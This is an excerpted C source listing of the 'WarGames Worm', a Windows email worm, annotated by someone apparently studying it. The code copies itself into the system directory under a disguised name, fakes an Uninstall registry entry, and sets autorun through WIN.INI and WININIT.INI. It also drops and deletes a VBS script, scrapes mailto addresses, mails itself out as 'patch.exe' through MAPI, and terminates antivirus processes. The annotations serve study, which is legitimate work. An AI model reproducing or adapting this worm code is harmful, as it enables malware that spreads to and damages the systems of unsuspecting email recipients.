...
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
	...
	//***************************************************************************//
	GetModuleFileName(hInst, filename, 100);//get the name of current process. "xxx.exe"
	GetSystemDirectory((char*)sysdir, 100);//get the root path of 'system'.
	SetCurrentDirectory(sysdir);//set the root path of 'system' to the current path(把system目录设置为当前目录)
	CopyFile(filename, "article.doc.exe", TRUE);//copy the file got by GetModuleFileName to "article.doc.exe"
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\WarGames Worm", &hReg);
	RegSetValueEx(hReg, "DisplayName", 0, REG_SZ, (BYTE*)dn, 20);//the program name that user can see
	RegSetValueEx(hReg, "UninstallString", 0, REG_SZ, (BYTE*)ust, 40);//command used to unistall the program
	//set the value of the registry.The action is similar to Troan Horse,I think.
	//It will make the worm more difficult detected.
	RegCloseKey(hReg);
	//***************************************************************************//
	randomize();
	num = rand() % 10;
randname:
	...
	if (++counter == num) {//if coounter more than 9, then the "endrandname:" will not execute,right?
		...
		//***************************************************************************//
		CopyFile(filename, copyr, FALSE);//worms self-replicate
		//***************************************************************************//

		WriteProfileString("WINDOWS", "RUN", copyr);
		WritePrivateProfileString("rename", "NUL", filename, "WININIT.INI");
		//I still do not know why it needs to modify the WININIT.INI?
		goto endrandname;
	}
...
endrandname:
	...
	//used to get some directories' path

	//This is used to judge if the local system connects the Internet
	_asm
	{
		call	@wininet
		db	"WININET.DLL", 0
	...
	fclose(vbsworm);
	//***************************************************************************//
	ShellExecute(NULL, "open", "wargames.vbs", NULL, NULL, SW_SHOWNORMAL);//execute the script.
	//***************************************************************************//
	Sleep(5000);
	DeleteFile("wargames.vbs");//delete the script, make it difficult to track.
	...
	mLogon(NULL, NULL, NULL, MAPI_NEW_SESSION, NULL, &session);//Log in the Outlook.(by default)
...
//有个问题，扫描的文件里面为什么会有邮件的相关信息？
void GetMail(char* namefile, char* mail)//get the information(address) of the recipients.
{
	HANDLE	hf, hf2;
	char* mapped;
	DWORD	size, i, k;
	...
	while (i < size && !test) {
		if (!strncmpi("mailto:", mapped + i, strlen("mailto:"))) {
			test = TRUE;
			i += strlen("mailto:");//find the mail header.
			k = 0;
...
void sendmail(char* tos)
{
	...
	mess.lpFiles->lpszFileName = "patch.exe";//this attachment is a malware!
	//***********************************************************************************//
	mess.nFileCount = 1;
...
/*I think it is a easy way to stop the process of the virus, 
but if we don't know the name of virus, 
or the OS cannot terminate the process by the API TerminateProcess because of lower-authoriazation*/
void StopAV(char* antivirus)//close the target process or module
{
	register BOOL term;
	lSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //enumerate all the process ID.
	uProcess.dwSize = sizeof(uProcess);
	rProcessFound = Process32First(lSnapshot, &uProcess);
	//get the information of the first process in the OS.
	while (rProcessFound) {
		if (strstr(uProcess.szExeFile, antivirus) != NULL) { 
			myproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, uProcess.th32ProcessID);
			//get the handle of the process we want to terminate.
			if (myproc != NULL) {
				term = TerminateProcess(myproc, 0);
			}
			CloseHandle(myproc);
		}
		rProcessFound = Process32Next(lSnapshot, &uProcess);//get the information of the next process.
	}
